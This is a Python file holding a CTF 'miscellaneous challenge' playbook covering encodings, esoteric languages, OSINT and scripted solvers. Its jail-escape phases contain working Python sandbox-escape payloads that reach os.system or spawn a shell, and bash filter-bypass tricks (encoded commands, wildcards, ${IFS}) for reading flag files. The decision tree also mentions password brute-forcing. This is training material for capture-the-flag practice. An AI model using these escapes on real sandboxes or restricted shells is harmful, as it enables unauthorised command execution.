"""Miscellaneous challenge playbook — expert-level methodology."""

PLAYBOOK = r"""\
## Miscellaneous Challenge Playbook

Misc challenges span many disciplines. The key is rapid identification
of what type of challenge it is, then applying the right technique.

---

### PHASE 1: Quick Identification

1. **Read the challenge name and description extremely carefully.**
   - Names often pun on the technique needed (e.g., "Base"d → base encoding)
   - Descriptions may contain hidden hints or be part of the puzzle themselves

2. **Examine provided files:**
   ```bash
   file ./challenge_file
   xxd ./challenge_file | head
   strings ./challenge_file | head -30
   ```

3. **If it's a network service:**
   ```bash
   nc host port
   # Read the banner carefully. Is it a:
   # - math/programming challenge?
   # - quiz/trivia?
   # - game to exploit?
   # - jail/sandbox escape?
   ```

---

### PHASE 2: Encoding / Decoding Challenges

#### 2.1 Common Encodings (try these first!)
```python
import base64, codecs, binascii

data = "..."  # the encoded string

# Base64
try: print("b64:", base64.b64decode(data))
except: pass

# Base32
try: print("b32:", base64.b32decode(data))
except: pass

# Base85 / Ascii85
try: print("b85:", base64.b85decode(data))
except: pass

# Hex
try: print("hex:", bytes.fromhex(data))
except: pass

# URL encoding
from urllib.parse import unquote
print("url:", unquote(data))

# ROT13
print("rot13:", codecs.decode(data, 'rot_13'))

# Binary string (01100110 01101100 ...)
if all(c in '01 ' for c in data):
    bits = data.replace(' ', '')
    print("bin:", bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8)))

# Decimal ASCII (102 108 97 103 ...)
if all(c in '0123456789 ' for c in data.strip()):
    nums = [int(x) for x in data.split()]
    if all(0 <= n < 256 for n in nums):
        print("dec:", bytes(nums))

# Octal
if all(c in '01234567 ' for c in data.strip()):
    print("oct:", bytes(int(x, 8) for x in data.split()))
```

#### 2.2 Esoteric Encodings
```python
# Morse code
MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E',
         '..-.':'F','--.':'G','....':'H','..':'I','.---':'J',
         '-.-':'K','.-..':'L','--':'M','-.':'N','---':'O',
         '.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T',
         '..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y',
         '--..':'Z','-----':'0','.----':'1','..---':'2',
         '...--':'3','....-':'4','.....':'5','-....':'6',
         '--...':'7','---..':'8','----.':'9'}
words = data.split('/')
decoded = ' '.join(''.join(MORSE.get(c,'?') for c in w.split()) for w in words)

# Braille (Unicode dots pattern)
# ⠓⠑⠇⠇⠕ → parse Unicode Braille characters

# NATO phonetic alphabet
# Alpha Bravo Charlie → ABC

# Bacon cipher (aabba aabab ...)
# 5 letters of a/b map to A-Z

# Base58 (Bitcoin addresses)
# Base62, Base91, Base122
```

#### 2.3 Multi-Layer Encoding
```python
# Common CTF pattern: data is encoded multiple times
# Strategy: decode, check if result looks encoded, repeat
import base64

data = b"..."
for i in range(10):
    try:
        decoded = base64.b64decode(data)
        print(f"Layer {i}: {decoded[:50]}")
        if b'flag' in decoded:
            print(f"FLAG: {decoded}")
            break
        data = decoded
    except:
        break
```

---

### PHASE 3: Python Jail Escapes

#### 3.1 Classic Python Sandbox Escapes
```python
# If eval() or exec() with restrictions:

# Access builtins via class hierarchy
().__class__.__bases__[0].__subclasses__()
# Find os._wrap_close or subprocess.Popen in the list

# Import via __builtins__
__builtins__.__import__('os').system('cat /flag*')

# If __builtins__ is deleted:
# Recover via any object's __class__
[].__class__.__base__.__subclasses__()
# Find <class 'os._wrap_close'> at index ~133 (varies by Python version)
[].__class__.__base__.__subclasses__()[133].__init__.__globals__['system']('cat /flag*')

# If 'import' keyword is blocked:
__import__ = __builtins__.__dict__['__import__']
# Or: getattr(__builtins__, '__import__')('os')

# Build strings without using blocked characters
chr(111)+chr(115)  # "os"
getattr(getattr(''.__class__.__mro__[1],'__subclasses__')()[133].__init__,'__globals__')['system']('sh')
```

#### 3.2 Character / Keyword Bypass
```python
# If certain characters are blocked:

# No quotes: use chr()
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))

# No parentheses: use decorators or __getitem__
# @exec decorator trick (Python 3.12+)

# No dots: use getattr()
getattr(getattr(__builtins__, chr(95)*2 + 'import' + chr(95)*2)(chr(111)+'s'), 'system')('sh')

# No underscores: find alternate access
vars()  # same as locals() or dir()

# Blacklist bypass with Unicode:
# ᵢₘₚₒᵣₜ = import (Unicode look-alikes for some filters)

# Numeric only — build code from numbers:
eval(str(chr(x) for x in [111,115]))
```

#### 3.3 pyjail via AST / compile
```python
# If input is parsed as AST:
# Some operators survive: +, -, *, /, %, ^, ~, |, &
# Walrus operator :=
# List comprehensions
# Lambda functions
[x for x in ().__class__.__base__.__subclasses__() if 'wrap' in str(x)]
```

---

### PHASE 4: Bash Jail Escapes

```bash
# If restricted shell with limited commands:

# Read files without cat/head/tail:
while read line; do echo "$line"; done < /flag.txt
exec < /flag.txt; while read l; do echo "$l"; done
source /flag.txt  # might error but shows content in error msg
. /flag.txt       # same as source
mapfile < /flag.txt; echo "${MAPFILE[@]}"

# If echo is available:
echo "$(<flag.txt)"

# Command execution without letters:
$'\143\141\164' $'\057\146\154\141\147'   # cat /flag (octal)
$'\x63\x61\x74' $'\x2f\x66\x6c\x61\x67' # cat /flag (hex)

# Path manipulation:
/???/c?t /f*                              # /bin/cat /flag*
/???/???/p??h?n3 -c 'import os;os.system("cat /flag*")'

# Using environment variables:
${PATH:0:1}  # usually gives '/'

# Bypass character filters:
# No spaces: use ${IFS} or {cmd,arg} or <
{cat,/flag.txt}
cat${IFS}/flag.txt
cat</flag.txt

# Wildcard magic:
/bin/c?? /fl??.*
```

---

### PHASE 5: Programming / Math Challenges

```python
# Template for interactive programming challenges:
from pwn import *

io = remote('host', port)

while True:
    line = io.recvline().decode().strip()
    print(f"Received: {line}")

    # Parse the math/logic problem
    # Example: "What is 123 + 456?"
    import re
    match = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)', line)
    if match:
        a, op, b = int(match[1]), match[2], int(match[3])
        result = eval(f"{a}{op}{b}")
        io.sendline(str(result).encode())
    elif 'flag' in line.lower():
        print(f"FLAG: {line}")
        break

io.interactive()
```

---

### PHASE 6: Esoteric Programming Languages

| Language | Identifier | Example |
|----------|-----------|---------|
| **Brainfuck** | `+-><[].,` only | `++++++++++[>+++++++>+++++++++` |
| **Whitespace** | Only spaces/tabs/newlines | (file looks empty!) |
| **Malbolge** | Starts with `D'` | Very chaotic characters |
| **JSFuck** | `[]()!+` only | `[][(![]+[])[+[]]...` |
| **Ook** | `Ook.` `Ook?` `Ook!` | Ook-based Brainfuck variant |
| **Piet** | An image | Program as a pixel art image |
| **Rockstar** | Reads like song lyrics | Variables are phrases |

```python
# Brainfuck interpreter
def brainfuck(code, input_data=''):
    tape, ptr, pc, output, input_idx = [0]*30000, 0, 0, [], 0
    brackets = {}
    stack = []
    for i, c in enumerate(code):
        if c == '[': stack.append(i)
        elif c == ']':
            j = stack.pop()
            brackets[i] = j
            brackets[j] = i
    while pc < len(code):
        c = code[pc]
        if c == '+': tape[ptr] = (tape[ptr] + 1) % 256
        elif c == '-': tape[ptr] = (tape[ptr] - 1) % 256
        elif c == '>': ptr += 1
        elif c == '<': ptr -= 1
        elif c == '.': output.append(chr(tape[ptr]))
        elif c == ',':
            tape[ptr] = ord(input_data[input_idx]) if input_idx < len(input_data) else 0
            input_idx += 1
        elif c == '[' and tape[ptr] == 0: pc = brackets[pc]
        elif c == ']' and tape[ptr] != 0: pc = brackets[pc]
        pc += 1
    return ''.join(output)
```

---

### PHASE 7: OSINT Techniques

```
# Image reverse search
# → Google Images, TinEye, Yandex Images

# Domain/IP investigation
whois domain.com
dig domain.com ANY
nslookup domain.com

# Wayback Machine
# Check https://web.archive.org/web/*/target-url

# Social media username search
# Check across platforms: github, twitter, reddit, etc.

# EXIF GPS coordinates
exiftool -GPSLatitude -GPSLongitude image.jpg
# Convert to decimal and search on maps

# File metadata
# Check document properties, creation dates, author names
```

---

### Decision Tree
```
What are you given?
├── Encoded text → Phase 2 (try common encodings)
├── Network service → connect, read banner
│   ├── Math/programming → Phase 5 (scripted solver)
│   ├── "Enter command" → Phase 3/4 (jail escape)
│   └── Game/quiz → automate interaction
├── Image file → could be stego (see forensics) or Piet program
├── Strange-looking code → Phase 6 (esoteric language)
├── Description mentions person/place/event → Phase 7 (OSINT)
├── ZIP/archive with password → brute-force with fcrackzip/john
└── Multiple files → check relationships, look for patterns
```
"""
